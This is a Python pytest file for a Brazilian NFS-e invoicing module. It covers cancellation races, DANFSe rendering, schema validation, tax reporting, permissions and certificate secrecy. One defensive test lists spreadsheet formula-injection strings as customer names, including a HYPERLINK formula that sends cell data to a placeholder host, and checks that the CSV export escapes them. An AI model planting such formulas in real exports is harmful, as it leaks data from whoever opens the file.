def test_o_banco_recusa_duas_notas_vivas_do_mesmo_recibo(casa):
    import sqlite3
    db = casa["db"]
    rid = _recibo(db, numero=114)
    _endereco(db)
    _emitir(casa, rid)
    nota = _nota_do_recibo(db, rid)
    with pytest.raises(sqlite3.IntegrityError):
        with db.transaction() as con:
            banco(con).escrever(
                """INSERT INTO nfse_notas (recibo_id, provedor, ambiente, situacao, serie,
                       numero_dps, id_dps, tomador_documento, tomador_nome, valor_servico,
                       xml_dps, criado_em)
                   VALUES (%s, 'nacional', 'homologacao', 'ENVIANDO', '1', 99, 'DPSX',
                           %s, 'X', 1, '<x/>', 'agora')""", (rid, TOMADOR))
    assert _nota_do_recibo(db, rid)["id"] == nota["id"]


def test_lote_do_dia_emite_os_prontos_e_deixa_os_pendentes(casa):
    db = casa["db"]
    _endereco(db)
    prontos = [_recibo(db, numero=n) for n in (120, 121)]
    sem_cpf = _recibo(db, numero=122, documento=None)
    de_outro_dia = _recibo(db, numero=123, data="2026-10-18")
    c = casa["c"]
    html = c.post("/caixa/nfse/lote", data={"csrf_token": _token(c), "data": "2026-10-19"},
                  follow_redirects=True).get_data(as_text=True)
    assert "2 emitida(s)" in html
    for rid in prontos:
        assert _nota_do_recibo(db, rid)["situacao"] == NFSE.EMITIDA
    with db.connect() as con:
        assert NFSE.notas_do_recibo(con, sem_cpf) == []
        assert NFSE.notas_do_recibo(con, de_outro_dia) == []


# ---------------------------------------------- cancelamento e o DANFSe

def test_cancelar_manda_o_evento_assinado_e_limpa_o_recibo(casa):
    db = casa["db"]
    rid = _recibo(db, numero=130)
    _endereco(db)
    _emitir(casa, rid)
    nota = _nota_do_recibo(db, rid)
    c = casa["c"]
    html = c.post(f"/caixa/nfse/nota/{nota['id']}/cancelar", data={
        "csrf_token": _token(c), "motivo": "1",
        "justificativa": "Valor do serviço lançado errado no recibo"},
        follow_redirects=True).get_data(as_text=True)
    assert "NFS-e cancelada" in html
    assert nota["chave"] in casa["sefin"].canceladas
    depois = _nota_do_recibo(db, rid)
    assert depois["situacao"] == NFSE.CANCELADA
    # cancelada por erro, o recibo pode ganhar a nota certa
    _emitir(casa, rid)
    with db.connect() as con:
        assert [n["situacao"] for n in NFSE.notas_do_recibo(con, rid)] == [
            NFSE.CANCELADA, NFSE.EMITIDA]


class ProvedorComClique:
    """O provedor da casa, e outro clique que acontece enquanto ele fala com a rede."""

    def __init__(self, real, *, ao_perguntar=None, ao_emitir=None):
        self.real, self.ao_perguntar, self.ao_emitir = real, ao_perguntar, ao_emitir

    def __getattr__(self, nome):
        return getattr(self.real, nome)

    def consultar_dps(self, id_dps):
        resposta = self.real.consultar_dps(id_dps)
        if self.ao_perguntar:
            self.ao_perguntar()
        return resposta

    def emitir(self, xml):
        if self.ao_emitir:
            self.ao_emitir()
        return self.real.emitir(xml)


def _na_fila(casa, numero: int) -> tuple[int, dict]:
    """Um recibo cuja DPS saiu com a Sefin fora do ar: ENVIANDO, sem chave."""
    db = casa["db"]
    rid = _recibo(db, numero=numero)
    _endereco(db)
    casa["sefin"].fora_do_ar = True
    _emitir(casa, rid)
    casa["sefin"].fora_do_ar = False
    nota = _nota_do_recibo(db, rid)
    assert (nota["situacao"], nota["chave"], nota["tentativas"]) == (NFSE.ENVIANDO, None, 1)
    return rid, nota


def test_cancelar_nao_apaga_a_nota_que_um_reenvio_emitiu_durante_a_pergunta(casa, pfx):
    """O cancelamento lê ENVIANDO e pergunta à Sefin; nesse meio, outro clique
    reenvia e a DPS vira nota. Cancelar só aqui seria NFS-e válida lá sem
    registro na casa — a nota tem de continuar EMITIDA."""
    db = casa["db"]
    rid, nota = _na_fila(casa, 132)
    cfg, cert = _cfg(db), DPS.abrir_pfx(pfx, SENHA_DO_A1)
    real = NFSE.provedor_da_casa(cfg, cert)
    provedor = ProvedorComClique(real, ao_perguntar=lambda: NFSE.enviar(
        db, nota["id"], real, usuario="outro clique"))
    with pytest.raises(NFSE.NfseError, match="A nota mudou enquanto o cancelamento"):
        NFSE.cancelar(db, nota["id"], provedor=provedor, certificado=cert, cfg=cfg,
                      motivo="1", justificativa="Valor do serviço lançado errado",
                      usuario="teste")
    depois = _nota_do_recibo(db, rid)
    assert depois["situacao"] == NFSE.EMITIDA
    assert depois["chave"] == casa["sefin"].emitidas[nota["id_dps"]]["chave"]
    assert casa["sefin"].canceladas == set()


def test_resposta_que_chega_depois_do_cancelamento_e_da_nota_nova_avisa_sem_estourar(casa,
                                                                                      pfx):
    """A DPS em voo vira nota depois de cancelada aqui, e o recibo já tem a nota
    nova: as duas não cabem no índice de uma viva por recibo. Em vez do
    IntegrityError (500 na tela), o balcão lê a chave a cancelar no emissor."""
    db = casa["db"]
    rid, velha = _na_fila(casa, 133)
    cfg, cert = _cfg(db), DPS.abrir_pfx(pfx, SENHA_DO_A1)
    real = NFSE.provedor_da_casa(cfg, cert)

    def cancela_e_emite_outra():
        NFSE.cancelar(db, velha["id"], provedor=real, certificado=cert, cfg=cfg,
                      motivo="1", justificativa="Valor do serviço lançado errado",
                      usuario="teste")
        NFSE.emitir(db, rid, provedor=real, certificado=cert, cfg=cfg, usuario="teste")

    with pytest.raises(NFSE.NfseError, match="Cancele essa chave direto no emissor"):
        NFSE.enviar(db, velha["id"], ProvedorComClique(real, ao_emitir=cancela_e_emite_outra),
                    usuario="teste")
    chave = casa["sefin"].emitidas[velha["id_dps"]]["chave"]
    with db.connect() as con:
        notas = NFSE.notas_do_recibo(con, rid)
        rastro = NFSE.eventos(con, velha["id"])
    assert [n["situacao"] for n in notas] == [NFSE.CANCELADA, NFSE.EMITIDA]
    assert notas[0]["chave"] is None and notas[1]["chave"] != chave
    assert rastro[-1]["resultado"] == "alerta" and chave in rastro[-1]["mensagem"]


def test_danfse_sai_do_xml_da_nota_sem_rede_e_sem_a_api_suspensa(casa, monkeypatch):
    """NT 008/2026: a API do DANFSe do ADN parou em 1º/07/2026; o papel é da casa."""
    import impressao_pdf
    paginas = []
    monkeypatch.setattr(impressao_pdf, "pdf_de_html_chrome",
                        lambda html, **_k: paginas.append(html) or b"%PDF-1.7 ficticio")
    db = casa["db"]
    rid = _recibo(db, numero=131)
    _endereco(db)
    _emitir(casa, rid)
    nota = _nota_do_recibo(db, rid)
    casa["sefin"].fora_do_ar = True
    c = casa["c"]
    pdf = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse")
    assert pdf.status_code == 200 and pdf.data.startswith(b"%PDF-")
    folha = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse?formato=html").get_data(as_text=True)
    assert paginas and "DANFSe v2.0" in paginas[0]
    for esperado in ("DANFSe v2.0", "Documento Auxiliar da NFS-e", nota["chave"],
                     "NFS-e SEM VALIDADE JURÍDICA",            # homologação (item 2.4.3)
                     "Notário ou Registrador", "R$ 5,28",       # ISS que a Sefin apurou
                     "000 / 000001", "1.1304.00.00",
                     "O DESTINATÁRIO É O PRÓPRIO TOMADOR/ADQUIRENTE DA OPERAÇÃO",
                     "Totais Aproximados dos Tributos cfe. Lei nº 12.741/2012",
                     'class="qr" src="data:image/svg+xml'):
        assert esperado in folha, esperado
    assert "CANCELADA" not in folha
    import nfse_danfse
    assert nfse_danfse.dados(nota["xml_nfse"])["url_consulta"] == (
        "https://www.nfse.gov.br/ConsultaPublica/?tpc=1&chave=" + nota["chave"])
    assert not [u for _m, u in casa["sefin"].chamadas if "danfse" in u]


def test_danfse_da_nota_cancelada_leva_a_marca_dagua(casa):
    db = casa["db"]
    rid = _recibo(db, numero=132)
    _endereco(db)
    _emitir(casa, rid)
    nota = _nota_do_recibo(db, rid)
    NFSE.cancelar(db, nota["id"], provedor=NFSE.provedor_da_casa(_cfg(db), NFSE.ler_certificado()),
                  certificado=NFSE.ler_certificado(), cfg=_cfg(db), motivo="1",
                  justificativa="Erro de digitação no valor", usuario="teste")
    folha = NFSE.danfse(db, nota["id"], usuario="teste", formato="html")
    assert '<div class="marca"><span>CANCELADA</span></div>' in folha


# ------------------------------------------------- leiaute 1.01 e reforma

def _chave_ficticia() -> str:
    return f"{MUNICIPIO}2{1:042d}"


def test_cancelamento_passa_no_esquema_oficial_e_o_id_tem_59_caracteres(pfx):
    """O `Id` levava um número de pedido (62) e o XML um `nPedRegEvento`; o XSD recusa os dois."""
    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
    xml = DPS.assinar(DPS.montar_cancelamento(
        ambiente="homologacao", quando=datetime(2026, 10, 24, 10, 0, tzinfo=timezone(
            timedelta(hours=-3))), autor=PRESTADOR, chave=_chave_ficticia(), motivo="1",
        justificativa="Erro na emissão de teste"), cert)
    raiz = etree.fromstring(xml)
    assert LEIAUTE_DO_EVENTO.validate(raiz), LEIAUTE_DO_EVENTO.error_log
    assert raiz.get("versao") == "1.01"
    assert raiz[0].get("Id") == f"PRE{_chave_ficticia()}101101"
    assert raiz.find("n:infPedReg/n:nPedRegEvento", NS) is None


def test_dps_com_nbs_e_ibscbs_passa_no_esquema_oficial(pfx):
    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
    xml = DPS.assinar(DPS.montar_dps(
        ambiente="homologacao", emitida_em=datetime(2026, 10, 24, 10, 0, tzinfo=timezone(
            timedelta(hours=-3))), serie="1", numero=8,
        prestador=DPS.Prestador(PRESTADOR, "12345", MUNICIPIO),
        tomador=DPS.Tomador(TOMADOR, "TOMADORA FICTICIA", "65000000", MUNICIPIO,
                            "RUA FICTICIA", "10", "", "CENTRO"),
        servico=DPS.Servico("210101", "Emolumentos", 12003, "", "001", "113040000"),
        ibscbs=DPS.IbsCbs(cst="000", classificacao="000001", indicador_operacao="100301")),
        cert)
    raiz = etree.fromstring(xml)
    assert LEIAUTE.validate(raiz), LEIAUTE.error_log
    assert raiz.findtext("n:infDPS/n:serv/n:cServ/n:cNBS", namespaces=NS) == "113040000"
    assert raiz.findtext("n:infDPS/n:IBSCBS/n:valores/n:trib/n:gIBSCBS/n:cClassTrib",
                         namespaces=NS) == "000001"
    assert raiz.find("n:infDPS/n:valores/n:trib/n:tribMun/n:pAliq", NS) is None


@pytest.mark.parametrize("grupo, frase", [
    (DPS.IbsCbs("000", "200001", "100301"), "não pertence ao CST"),
    (DPS.IbsCbs("00", "000001", "100301"), "3 dígitos"),
    (DPS.IbsCbs("000", "000001", "1003"), "Anexo C"),
    (DPS.IbsCbs("000", "000001", "100301", destinatario="1"), "Destinatário"),
])
def test_classificacao_do_ibscbs_fora_da_forma_e_recusada_antes_da_rede(grupo, frase):
    with pytest.raises(DPS.DpsError, match=frase):
        DPS.conferir_ibscbs(grupo)


def test_com_convenio_ativo_e_fora_do_simples_a_aliquota_nao_vai_na_nota():
    """Regra E0617 do Anexo I v1.01."""
    base = {"nfse_aliquota": "5,00", "nfse_optante_simples": "1"}
    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "1"}) == ""
    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "0"}) == "5,00"
    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": ""}) == "5,00"
    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "1",
                                     "nfse_optante_simples": "3"}) == "5,00"


def test_a_nota_emitida_leva_o_grupo_do_ibscbs_configurado(casa):
    db = casa["db"]
    rid = _recibo(db, numero=133)
    _endereco(db)
    _emitir(casa, rid)
    nota = _nota_do_recibo(db, rid)
    raiz = etree.fromstring(nota["xml_dps"].encode("utf-8"))
    assert raiz.findtext("n:infDPS/n:IBSCBS/n:cIndOp", namespaces=NS) == "100301"
    assert raiz.findtext("n:infDPS/n:serv/n:cServ/n:cNBS", namespaces=NS) == "113040000"
    sem = {**CONFIG_LIGADA, "nfse_ibscbs_cst": "", "nfse_ibscbs_classificacao": ""}
    assert any("IBS/CBS" in a for a in NFSE.avisos_da_configuracao(sem))
    with pytest.raises(NFSE.NfseError, match="CST"):
        NFSE.conferir_configuracao({**CONFIG_LIGADA, "nfse_ibscbs_classificacao": "200001"})


def test_apuracao_do_mes_soma_o_iss_que_a_sefin_apurou_e_deixa_a_cancelada_de_fora(casa):
    db = casa["db"]
    _endereco(db)
    for numero in (134, 135):
        _emitir(casa, _recibo(db, numero=numero))
    with db.connect() as con:
        notas = banco(con).ler("SELECT id, xml_dps FROM nfse_notas ORDER BY id")
    mes = etree.fromstring(notas[0]["xml_dps"].encode("utf-8")).findtext(
        "n:infDPS/n:dCompet", namespaces=NS)[:7]
    NFSE.cancelar(db, notas[-1]["id"], provedor=NFSE.provedor_da_casa(
        _cfg(db), NFSE.ler_certificado()), certificado=NFSE.ler_certificado(), cfg=_cfg(db),
        motivo="2", justificativa="Serviço não prestado no teste", usuario="teste")
    with db.connect() as con:
        a = NFSE.apuracao_do_mes(con, mes, ambiente="homologacao")
    assert a["quantidade"] == len(notas) - 1 and len(a["canceladas"]) == 1
    assert all(not n["estimado"] for n in a["notas"])
    assert a["total"]["iss"] == sum(n["iss"] for n in a["notas"]) > 0
    csv = casa["c"].get(f"/caixa/nfse/apuracao?mes={mes}&ambiente=homologacao&formato=csv")
    assert csv.status_code == 200 and b"TOTAL" in csv.data
    tela = casa["c"].get(f"/caixa/nfse/apuracao?mes={mes}&ambiente=homologacao")
    assert tela.status_code == 200 and "guia do ISS não sai daqui" in tela.get_data(as_text=True)


def test_o_csv_da_apuracao_desarma_a_formula_no_nome_do_tomador():
    """Revisão de segurança de 26/10/2026: o nome do tomador vem do cadastro
    do cliente, digitado no balcão; no CSV que o contador abre no Excel, um
    nome que começa com «=», «+», «-» ou «@» viraria fórmula. Ele tem de sair
    com o apóstrofo na frente, entre aspas, e o «;» dentro dele não pode
    deslocar as colunas."""
    import csv
    import io
    perigosos = ['=HYPERLINK("http://x/?"&A1;"ver")', "+1+1", "-2+3", "@SUM(A1:A2)",
                 "\t=1+1", "MARIO; DA SILVA"]
    nota = {"competencia": "2026-10-01", "numero": "1", "dps": "1/1", "chave": "=CHAVE",
            "tomador_documento": "***.000.002-**", "base": 10000, "aliquota": "2.00",
            "iss": 200, "estimado": False, "ibs": 0, "cbs": 0}
    apuracao = {"notas": [{**nota, "tomador": nome} for nome in perigosos],
                "total": {"base": 60000, "iss": 1200, "estimadas": 0, "ibs": 0, "cbs": 0}}
    import csv_seguro as CSVS
    texto = CSVS.gerar(NFSE.CABECALHO_DA_APURACAO, NFSE.linhas_da_apuracao(apuracao))
    linhas = list(csv.reader(io.StringIO(texto), delimiter=";"))
    assert len(linhas) == 2 + len(perigosos)
    assert all(len(linha) == 12 for linha in linhas)
    corpo = linhas[1:-1]
    assert [linha[4] for linha in corpo] == ["'" + perigosos[0], "'+1+1", "'-2+3",
                                             "'@SUM(A1:A2)", "'\t=1+1", "MARIO; DA SILVA"]
    assert all(linha[3] == "'=CHAVE" for linha in corpo)
    # nenhuma célula de texto começa como fórmula; os valores continuam números
    for linha in corpo:
        assert not any(c.startswith(("=", "+", "@", "\t", "\r")) for c in linha)
        assert linha[6] == "100,00" and linha[8] == "2,00"
    # QUOTE_ALL: toda célula sai entre aspas no arquivo
    assert texto.splitlines()[0].startswith('"competencia";"numero_nfse"')
    assert linhas[-1][0] == "TOTAL"


def test_parametros_do_municipio_sao_consultados_e_mostrados_como_vieram(casa):
    c = casa["c"]
    r = c.post("/administrativo/gestor/nfse", data={"csrf_token": _token(c),
                                                    "acao": "parametros"},
               follow_redirects=True)
    html = r.get_data(as_text=True)
    assert r.status_code == 200 and "convenio" in html and MUNICIPIO in html
    caminhos = [u for _m, u in casa["sefin"].chamadas if "parametros_municipais" in u]
    assert any(u.endswith(f"/{MUNICIPIO}/convenio") for u in caminhos)
    assert any(u.endswith(f"/{MUNICIPIO}/210101") for u in caminhos)


# ------------------------------------------- desligada, papéis e segredo

def test_emissao_nasce_desligada_e_na_homologacao_e_nao_toca_a_rede(cg_casa_logada, sefin,
                                                                     credenciais):
    db = cg_casa_logada["db"]
    cfg = _cfg(db)
    assert (cfg["nfse_ligada"], cfg["nfse_ambiente"]) == ("0", "homologacao")
    rid = _recibo(db, numero=140)
    html = _emitir(cg_casa_logada, rid).get_data(as_text=True)
    assert "desligada" in html
    assert sefin.chamadas == []


def test_certificado_e_senha_ficam_fora_do_banco_e_do_rastro(cg_casa_logada, credenciais, pfx):
    c = cg_casa_logada["c"]
    from io import BytesIO
    html = c.post("/administrativo/gestor/nfse", data={
        "csrf_token": _token(c), "acao": "certificado", "senha": SENHA_DO_A1,
        "pfx": (BytesIO(pfx), "a1.pfx")}, content_type="multipart/form-data",
        follow_redirects=True).get_data(as_text=True)
    assert "SERVENTIA FICTICIA DE TESTE gravado" in html
    assert SENHA_DO_A1 not in html
    assert (credenciais / NFSE.ARQUIVO_DO_CERTIFICADO).read_bytes() == pfx
    with cg_casa_logada["db"].connect() as con:
        bd = banco(con)
        settings = json.dumps(bd.ler("SELECT key, value FROM settings ORDER BY key"))
        rastro = json.dumps(bd.ler("SELECT action, details FROM audit_logs ORDER BY id"))
    assert SENHA_DO_A1 not in settings and SENHA_DO_A1 not in rastro
    assert "NFSE_CERTIFICADO_GRAVADO" in rastro


def test_a_configuracao_e_do_admin_e_vai_ao_rastro(cg_casa_logada, credenciais):
    c = cg_casa_logada["c"]
    c.post("/administrativo/gestor/nfse", data={
        "csrf_token": _token(c), "acao": "configuracao", **CONFIG_LIGADA})
    db = cg_casa_logada["db"]
    assert _cfg(db)["nfse_ligada"] == "1"
    with db.connect() as con:
        rastro = banco(con).um("SELECT details FROM audit_logs WHERE action = %s "
                               "ORDER BY id DESC LIMIT 1", ("NFSE_CONFIGURACAO_ALTERADA",))
    assert '"nfse_ligada": {"de": "0", "para": "1"}' in rastro["details"]


def test_configuracao_com_aliquota_acima_de_cinco_por_cento_e_recusada(cg_casa_logada):
    with pytest.raises(NFSE.NfseError, match="máximo 5%"):
        NFSE.conferir_configuracao({**CONFIG_LIGADA, "nfse_aliquota": "6"})


def test_quem_nao_e_admin_nao_configura_e_o_auditor_nao_emite(casa):
    db, app = casa["db"], casa["app"]
    db.create_user("escrevente", "ESCREVENTE FICTICIA", "Senha#12345", "USER")
    db.create_user("auditora", "AUDITORA FICTICIA", "Senha#12345", "AUDITOR")
    rid = _recibo(db, numero=150)
    usuario = app.test_client()
    cg_login(usuario, "escrevente", "Senha#12345")
    assert usuario.get("/administrativo/gestor/nfse").status_code == 403
    assert usuario.get("/caixa/nfse").status_code == 200
    auditora = app.test_client()
    cg_login(auditora, "auditora", "Senha#12345")
    assert auditora.get(f"/caixa/nfse/recibo/{rid}").status_code == 200
    assert auditora.post(f"/caixa/nfse/recibo/{rid}/emitir",
                         data={"csrf_token": _token(auditora)}).status_code == 403
    assert casa["sefin"].chamadas == []


def test_post_sem_o_token_do_formulario_e_recusado(casa):
    rid = _recibo(casa["db"], numero=151)
    assert casa["c"].post(f"/caixa/nfse/recibo/{rid}/emitir").status_code == 400
    assert casa["sefin"].chamadas == []


def test_as_telas_abrem_e_a_fila_diz_o_que_falta(casa):
    db = casa["db"]
    _recibo(db, numero=160, documento=None)
    c = casa["c"]
    fila = c.get("/caixa/nfse")
    assert fila.status_code == 200
    assert "Falta o CPF ou CNPJ do tomador" in fila.get_data(as_text=True)
    assert c.get("/administrativo/gestor/nfse").status_code == 200
    assert "Emitir NFS-e" in c.get("/caixa/recibos").get_data(as_text=True)
